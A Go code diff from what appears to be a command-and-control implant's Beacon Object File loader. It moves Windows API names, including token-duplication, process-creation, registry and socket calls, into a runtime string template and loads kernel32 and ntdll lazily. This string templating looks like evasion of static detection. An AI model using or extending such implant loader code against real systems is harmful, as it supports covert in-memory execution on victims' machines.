+	idxCoffApiGetProcessHeap         = 890
+	idxCoffApiHeapAlloc              = 891
+	idxCoffApiHeapFree               = 892
+	idxCoffApiWideCharToMultiByte    = 893
+	idxCoffApiGetCurrentThread       = 894
+	idxCoffApiGetThreadContext       = 895
+	idxCoffApiSetThreadContext       = 896
+	idxCoffApiSuspendThread          = 897
+	idxCoffApiResumeThread           = 898
+	idxCoffApiCreateThread           = 899
+	idxCoffApiExitThread             = 900
+	idxCoffApiGetSystemTime          = 901
+	idxCoffApiGetLocalTime           = 902
+	idxCoffApiGetFileAttributesA     = 903
+	idxCoffApiSetFileAttributesA     = 904
+	idxCoffApiCreateFileA            = 905
+	idxCoffApiReadFile               = 906
+	idxCoffApiWriteFile              = 907
+	idxCoffApiCloseHandle            = 908
+	idxCoffApiGetFileSize            = 909
+	idxCoffApiGetFileSizeEx          = 910
+	idxCoffApiFileTimeToSystemTime   = 911
+	idxCoffApiSystemTimeToTzSpecific = 912
+	idxCoffApiFindFirstFileA         = 913
+	idxCoffApiFindNextFileA          = 914
+	idxCoffApiFindClose              = 915
+	idxCoffApiGetLastError           = 916
+	idxCoffApiRtlCopyMemory          = 917
+
+	idxCoffFnStrlen   = 918
+	idxCoffFnStrcmp   = 919
+	idxCoffFnStrncmp  = 920
+	idxCoffFnStricmp  = 921
+	idxCoffFnStrnicmp = 922
+	idxCoffFnStrcpy   = 923
+	idxCoffFnStrncpy  = 924
+	idxCoffFnStrcat   = 925
+	idxCoffFnStrncat  = 926
+	idxCoffFnStrstr   = 927
+
+	idxCoffFnCalloc  = 928
+	idxCoffFnMalloc  = 929
+	idxCoffFnFree    = 930
+	idxCoffFnRealloc = 931
+	idxCoffFnMemcpy  = 932
+	idxCoffFnMemset  = 933
+	idxCoffFnMemmove = 934
+	idxCoffFnMemcmp  = 935
+
+	idxCoffFnVsnprintf  = 936
+	idxCoffFnVsnprintfU = 937
+	idxCoffFnSprintf    = 938
+
+	idxCoffApiMessageBoxA      = 939
+	idxCoffApiMessageBoxW      = 940
+	idxCoffApiGetDesktopWindow = 941
+	idxCoffApiGetForegroundWnd = 942
+	idxCoffApiGetWindowTextA   = 943
+	idxCoffApiGetWindowTextW   = 944
+	idxCoffApiFindWindowA      = 945
+	idxCoffApiFindWindowW      = 946
+
+	idxCoffApiWSAStartup    = 947
+	idxCoffApiWSACleanup    = 948
+	idxCoffApiWSAGetLastErr = 949
+	idxCoffApiSocket        = 950
+	idxCoffApiClosesocket   = 951
+	idxCoffApiBind          = 952
+	idxCoffApiListen        = 953
+	idxCoffApiAccept        = 954
+	idxCoffApiConnect       = 955
+	idxCoffApiSend          = 956
+	idxCoffApiRecv          = 957
+	idxCoffApiSendto        = 958
+	idxCoffApiRecvfrom      = 959
+	idxCoffApiSelect        = 960
+	idxCoffApiGethostbyname = 961
+	idxCoffApiGethostbyaddr = 962
+	idxCoffApiInet_addr     = 963
+	idxCoffApiInet_ntoa     = 964
+	idxCoffApiHtons         = 965
+	idxCoffApiHtonl         = 966
+	idxCoffApiNtohs         = 967
+	idxCoffApiNtohl         = 968
+
+	idxCoffApiRegOpenKeyExA        = 969
+	idxCoffApiRegCloseKey          = 970
+	idxCoffApiRegQueryValueExA     = 971
+	idxCoffApiRegSetValueExA       = 972
+	idxCoffApiOpenProcessToken     = 973
+	idxCoffApiGetTokenInformation  = 974
+	idxCoffApiSetTokenInformation  = 975
+	idxCoffApiDuplicateTokenEx     = 976
+	idxCoffApiCreateProcessAsUserA = 977
+
+	idxCoffFnBeaconOutput       = 978
+	idxCoffFnBeaconDataParse    = 979
+	idxCoffFnBeaconDataInt      = 980
+	idxCoffFnBeaconDataShort    = 981
+	idxCoffFnBeaconDataLength   = 982
+	idxCoffFnBeaconDataExtract  = 983
+	idxCoffFnBeaconPrintf       = 984
+	idxCoffFnBeaconFormatAlloc  = 985
+	idxCoffFnBeaconFormatFree   = 986
+	idxCoffFnBeaconFormatAppend = 987
+	idxCoffFnBeaconFormatPrintf = 988
+	idxCoffFnBeaconFormatToStr  = 989
+	idxCoffFnBeaconFormatInt    = 990
+
+	idxCoffFnBofstart       = 991
+	idxCoffFnInternalPrintf = 992
+	idxCoffFnPrintoutput    = 993
+	idxCoffFnIntAlloc       = 994
+	idxCoffFnIntFree        = 995
+	idxCoffFnIntMemset      = 996
+	idxCoffFnIntMemcpy      = 997
+	idxCoffFnIntRealloc     = 998
+	idxCoffFnIntStrlen      = 999
+	idxCoffFnIntStrcmp      = 1000
+	idxCoffFnIntStrncmp     = 1001
+	idxCoffFnIntStrcpy      = 1002
+	idxCoffFnIntStrncpy     = 1003
+	idxCoffFnIntStrcat      = 1004
+	idxCoffFnIntStrncat     = 1005
+	idxCoffFnToWideChar     = 1006
+	idxCoffFnUtf8ToUtf16    = 1007
+	idxCoffFnUtf16ToUtf8    = 1008
+)
+
+// coffTpl returns template string at index, with empty string fallback
+func coffTpl(idx int) string {
+	if coffTemplate != nil && idx < len(coffTemplate) {
+		return coffTemplate[idx]
+	}
+	return ""
+}
+
+// SetCOFFTemplate initializes COFF loader strings from a template
+// This must be called before using any COFF loader functionality
+func SetCOFFTemplate(tpl []string) {
+	coffTemplate = tpl
+
+	// DLL names
+	coffDllKernel32 = coffTpl(idxCoffDllKernel32)
+	coffDllNtdll = coffTpl(idxCoffDllNtdll)
+	coffDllUser32 = coffTpl(idxCoffDllUser32)
+	coffDllWs2_32 = coffTpl(idxCoffDllWs2_32)
+	coffDllAdvapi32 = coffTpl(idxCoffDllAdvapi32)
+
+	// Prefixes/suffixes
+	coffPrefixImp = coffTpl(idxCoffPrefixImp)
+	coffSuffixDll = coffTpl(idxCoffSuffixDll)
+	coffPrefixUs = coffTpl(idxCoffPrefixUs)
+	coffSectionBss = coffTpl(idxCoffSectionBss)
+
+	// Kernel32 API names
+	coffApiFreeLibrary = coffTpl(idxCoffApiFreeLibrary)
+	coffApiLoadLibraryA = coffTpl(idxCoffApiLoadLibraryA)
+	coffApiGetProcAddress = coffTpl(idxCoffApiGetProcAddress)
+	coffApiGetModuleHandleA = coffTpl(idxCoffApiGetModuleHandleA)
+	coffApiGetModuleFileNameA = coffTpl(idxCoffApiGetModuleFileNameA)
+	coffApiVirtualAlloc = coffTpl(idxCoffApiVirtualAlloc)
+	coffApiVirtualFree = coffTpl(idxCoffApiVirtualFree)
+	coffApiVirtualProtect = coffTpl(idxCoffApiVirtualProtect)
+	coffApiSetLastError = coffTpl(idxCoffApiSetLastError)
+	coffApiGetCurrentProcess = coffTpl(idxCoffApiGetCurrentProcess)
+	coffApiGetProcessHeap = coffTpl(idxCoffApiGetProcessHeap)
+	coffApiHeapAlloc = coffTpl(idxCoffApiHeapAlloc)
+	coffApiHeapFree = coffTpl(idxCoffApiHeapFree)
+	coffApiWideCharToMultiByte = coffTpl(idxCoffApiWideCharToMultiByte)
+	coffApiGetCurrentThread = coffTpl(idxCoffApiGetCurrentThread)
+	coffApiGetThreadContext = coffTpl(idxCoffApiGetThreadContext)
+	coffApiSetThreadContext = coffTpl(idxCoffApiSetThreadContext)
+	coffApiSuspendThread = coffTpl(idxCoffApiSuspendThread)
+	coffApiResumeThread = coffTpl(idxCoffApiResumeThread)
+	coffApiCreateThread = coffTpl(idxCoffApiCreateThread)
+	coffApiExitThread = coffTpl(idxCoffApiExitThread)
+	coffApiGetSystemTime = coffTpl(idxCoffApiGetSystemTime)
+	coffApiGetLocalTime = coffTpl(idxCoffApiGetLocalTime)
+	coffApiGetFileAttributesA = coffTpl(idxCoffApiGetFileAttributesA)
+	coffApiSetFileAttributesA = coffTpl(idxCoffApiSetFileAttributesA)
+	coffApiCreateFileA = coffTpl(idxCoffApiCreateFileA)
+	coffApiReadFile = coffTpl(idxCoffApiReadFile)
+	coffApiWriteFile = coffTpl(idxCoffApiWriteFile)
+	coffApiCloseHandle = coffTpl(idxCoffApiCloseHandle)
+	coffApiGetFileSize = coffTpl(idxCoffApiGetFileSize)
+	coffApiGetFileSizeEx = coffTpl(idxCoffApiGetFileSizeEx)
+	coffApiFileTimeToSystemTime = coffTpl(idxCoffApiFileTimeToSystemTime)
+	coffApiSystemTimeToTzSpecific = coffTpl(idxCoffApiSystemTimeToTzSpecific)
+	coffApiFindFirstFileA = coffTpl(idxCoffApiFindFirstFileA)
+	coffApiFindNextFileA = coffTpl(idxCoffApiFindNextFileA)
+	coffApiFindClose = coffTpl(idxCoffApiFindClose)
+	coffApiGetLastError = coffTpl(idxCoffApiGetLastError)
+	coffApiRtlCopyMemory = coffTpl(idxCoffApiRtlCopyMemory)
+
+	// MSVCRT/String functions
+	coffFnStrlen = coffTpl(idxCoffFnStrlen)
+	coffFnStrcmp = coffTpl(idxCoffFnStrcmp)
+	coffFnStrncmp = coffTpl(idxCoffFnStrncmp)
+	coffFnStricmp = coffTpl(idxCoffFnStricmp)
+	coffFnStrnicmp = coffTpl(idxCoffFnStrnicmp)
+	coffFnStrcpy = coffTpl(idxCoffFnStrcpy)
+	coffFnStrncpy = coffTpl(idxCoffFnStrncpy)
+	coffFnStrcat = coffTpl(idxCoffFnStrcat)
+	coffFnStrncat = coffTpl(idxCoffFnStrncat)
+	coffFnStrstr = coffTpl(idxCoffFnStrstr)
+
+	// Memory functions
+	coffFnCalloc = coffTpl(idxCoffFnCalloc)
+	coffFnMalloc = coffTpl(idxCoffFnMalloc)
+	coffFnFree = coffTpl(idxCoffFnFree)
+	coffFnRealloc = coffTpl(idxCoffFnRealloc)
+	coffFnMemcpy = coffTpl(idxCoffFnMemcpy)
+	coffFnMemset = coffTpl(idxCoffFnMemset)
+	coffFnMemmove = coffTpl(idxCoffFnMemmove)
+	coffFnMemcmp = coffTpl(idxCoffFnMemcmp)
+
+	// Printf functions
+	coffFnVsnprintf = coffTpl(idxCoffFnVsnprintf)
+	coffFnVsnprintfU = coffTpl(idxCoffFnVsnprintfU)
+	coffFnSprintf = coffTpl(idxCoffFnSprintf)
+
+	// User32 functions
+	coffApiMessageBoxA = coffTpl(idxCoffApiMessageBoxA)
+	coffApiMessageBoxW = coffTpl(idxCoffApiMessageBoxW)
+	coffApiGetDesktopWindow = coffTpl(idxCoffApiGetDesktopWindow)
+	coffApiGetForegroundWnd = coffTpl(idxCoffApiGetForegroundWnd)
+	coffApiGetWindowTextA = coffTpl(idxCoffApiGetWindowTextA)
+	coffApiGetWindowTextW = coffTpl(idxCoffApiGetWindowTextW)
+	coffApiFindWindowA = coffTpl(idxCoffApiFindWindowA)
+	coffApiFindWindowW = coffTpl(idxCoffApiFindWindowW)
+
+	// WS2_32 functions
+	coffApiWSAStartup = coffTpl(idxCoffApiWSAStartup)
+	coffApiWSACleanup = coffTpl(idxCoffApiWSACleanup)
+	coffApiWSAGetLastErr = coffTpl(idxCoffApiWSAGetLastErr)
+	coffApiSocket = coffTpl(idxCoffApiSocket)
+	coffApiClosesocket = coffTpl(idxCoffApiClosesocket)
+	coffApiBind = coffTpl(idxCoffApiBind)
+	coffApiListen = coffTpl(idxCoffApiListen)
+	coffApiAccept = coffTpl(idxCoffApiAccept)
+	coffApiConnect = coffTpl(idxCoffApiConnect)
+	coffApiSend = coffTpl(idxCoffApiSend)
+	coffApiRecv = coffTpl(idxCoffApiRecv)
+	coffApiSendto = coffTpl(idxCoffApiSendto)
+	coffApiRecvfrom = coffTpl(idxCoffApiRecvfrom)
+	coffApiSelect = coffTpl(idxCoffApiSelect)
+	coffApiGethostbyname = coffTpl(idxCoffApiGethostbyname)
+	coffApiGethostbyaddr = coffTpl(idxCoffApiGethostbyaddr)
+	coffApiInet_addr = coffTpl(idxCoffApiInet_addr)
+	coffApiInet_ntoa = coffTpl(idxCoffApiInet_ntoa)
+	coffApiHtons = coffTpl(idxCoffApiHtons)
+	coffApiHtonl = coffTpl(idxCoffApiHtonl)
+	coffApiNtohs = coffTpl(idxCoffApiNtohs)
+	coffApiNtohl = coffTpl(idxCoffApiNtohl)
+
+	// Advapi32 functions
+	coffApiRegOpenKeyExA = coffTpl(idxCoffApiRegOpenKeyExA)
+	coffApiRegCloseKey = coffTpl(idxCoffApiRegCloseKey)
+	coffApiRegQueryValueExA = coffTpl(idxCoffApiRegQueryValueExA)
+	coffApiRegSetValueExA = coffTpl(idxCoffApiRegSetValueExA)
+	coffApiOpenProcessToken = coffTpl(idxCoffApiOpenProcessToken)
+	coffApiGetTokenInformation = coffTpl(idxCoffApiGetTokenInformation)
+	coffApiSetTokenInformation = coffTpl(idxCoffApiSetTokenInformation)
+	coffApiDuplicateTokenEx = coffTpl(idxCoffApiDuplicateTokenEx)
+	coffApiCreateProcessAsUserA = coffTpl(idxCoffApiCreateProcessAsUserA)
+
+	// Beacon API functions
+	coffFnBeaconOutput = coffTpl(idxCoffFnBeaconOutput)
+	coffFnBeaconDataParse = coffTpl(idxCoffFnBeaconDataParse)
+	coffFnBeaconDataInt = coffTpl(idxCoffFnBeaconDataInt)
+	coffFnBeaconDataShort = coffTpl(idxCoffFnBeaconDataShort)
+	coffFnBeaconDataLength = coffTpl(idxCoffFnBeaconDataLength)
+	coffFnBeaconDataExtract = coffTpl(idxCoffFnBeaconDataExtract)
+	coffFnBeaconPrintf = coffTpl(idxCoffFnBeaconPrintf)
+	coffFnBeaconFormatAlloc = coffTpl(idxCoffFnBeaconFormatAlloc)
+	coffFnBeaconFormatFree = coffTpl(idxCoffFnBeaconFormatFree)
+	coffFnBeaconFormatAppend = coffTpl(idxCoffFnBeaconFormatAppend)
+	coffFnBeaconFormatPrintf = coffTpl(idxCoffFnBeaconFormatPrintf)
+	coffFnBeaconFormatToStr = coffTpl(idxCoffFnBeaconFormatToStr)
+	coffFnBeaconFormatInt = coffTpl(idxCoffFnBeaconFormatInt)
+
+	// Helper functions
+	coffFnBofstart = coffTpl(idxCoffFnBofstart)
+	coffFnInternalPrintf = coffTpl(idxCoffFnInternalPrintf)
+	coffFnPrintoutput = coffTpl(idxCoffFnPrintoutput)
+	coffFnIntAlloc = coffTpl(idxCoffFnIntAlloc)
+	coffFnIntFree = coffTpl(idxCoffFnIntFree)
+	coffFnIntMemset = coffTpl(idxCoffFnIntMemset)
+	coffFnIntMemcpy = coffTpl(idxCoffFnIntMemcpy)
+	coffFnIntRealloc = coffTpl(idxCoffFnIntRealloc)
+	coffFnIntStrlen = coffTpl(idxCoffFnIntStrlen)
+	coffFnIntStrcmp = coffTpl(idxCoffFnIntStrcmp)
+	coffFnIntStrncmp = coffTpl(idxCoffFnIntStrncmp)
+	coffFnIntStrcpy = coffTpl(idxCoffFnIntStrcpy)
+	coffFnIntStrncpy = coffTpl(idxCoffFnIntStrncpy)
+	coffFnIntStrcat = coffTpl(idxCoffFnIntStrcat)
+	coffFnIntStrncat = coffTpl(idxCoffFnIntStrncat)
+	coffFnToWideChar = coffTpl(idxCoffFnToWideChar)
+	coffFnUtf8ToUtf16 = coffTpl(idxCoffFnUtf8ToUtf16)
+	coffFnUtf16ToUtf8 = coffTpl(idxCoffFnUtf16ToUtf8)
+}
+
 var (
-	coffKernel32       = syscall.MustLoadDLL(coffDllKernel32)
-	coffNtdll          = syscall.MustLoadDLL(coffDllNtdll)
-	procVirtualAlloc   = coffKernel32.MustFindProc(coffApiVirtualAlloc)
-	procVirtualProtect = coffKernel32.MustFindProc(coffApiVirtualProtect)
-	procVirtualFree    = coffKernel32.MustFindProc(coffApiVirtualFree)
-	procRtlCopyMemory  = coffNtdll.MustFindProc(coffApiRtlCopyMemory)
+	// DLL handles and proc addresses - initialized lazily by initCOFFDLLs
+	coffKernel32       *syscall.DLL
+	coffNtdll          *syscall.DLL
+	procVirtualAlloc   *syscall.Proc
+	procVirtualProtect *syscall.Proc
+	procVirtualFree    *syscall.Proc
+	procRtlCopyMemory  *syscall.Proc
+	coffDLLsInitialized bool
+	coffDLLsInitMutex   sync.Mutex
+
 	// Global map to keep allocated memory alive during BOF execution
 	bofAllocations = make(map[uintptr][]byte)
 	bofAllocMutex  sync.Mutex
 )
+
+// initCOFFDLLs lazily initializes DLL handles and proc addresses
+// Must be called after SetCOFFTemplate
+func initCOFFDLLs() error {
+	coffDLLsInitMutex.Lock()
+	defer coffDLLsInitMutex.Unlock()
+
+	if coffDLLsInitialized {
+		return nil
+	}
+
+	var err error
+	coffKernel32, err = syscall.LoadDLL(coffDllKernel32)
+	if err != nil {
+		return fmt.Errorf("failed to load %s: %w", coffDllKernel32, err)
+	}
+
+	coffNtdll, err = syscall.LoadDLL(coffDllNtdll)
+	if err != nil {
+		return fmt.Errorf("failed to load %s: %w", coffDllNtdll, err)
+	}
+
+	procVirtualAlloc, err = coffKernel32.FindProc(coffApiVirtualAlloc)
+	if err != nil {
+		return fmt.Errorf("failed to find %s: %w", coffApiVirtualAlloc, err)
+	}
+
+	procVirtualProtect, err = coffKernel32.FindProc(coffApiVirtualProtect)
+	if err != nil {
+		return fmt.Errorf("failed to find %s: %w", coffApiVirtualProtect, err)
+	}
+
+	procVirtualFree, err = coffKernel32.FindProc(coffApiVirtualFree)
+	if err != nil {
+		return fmt.Errorf("failed to find %s: %w", coffApiVirtualFree, err)
+	}
+
+	procRtlCopyMemory, err = coffNtdll.FindProc(coffApiRtlCopyMemory)
+	if err != nil {
+		return fmt.Errorf("failed to find %s: %w", coffApiRtlCopyMemory, err)
+	}
+
+	coffDLLsInitialized = true
+	return nil
+}
 
 // Global output buffer for BOFs
 var bofOutputBuffer []byte
@@ -1062,6 +1441,11 @@ func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, e
 // LoadWithMethodAndTimeout is the main implementation with configurable timeout
 // This is your existing LoadWithMethod function, but renamed and with timeout parameter
 func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, timeout time.Duration) (string, error) {
+	// Ensure DLLs are initialized (requires SetCOFFTemplate to be called first)
+	if err := initCOFFDLLs(); err != nil {
+		return "", fmt.Errorf("failed to initialize COFF DLLs: %w", err)
+	}
+
 	output := make(chan interface{}, 100)
 
 	// Add panic recovery for the entire load process
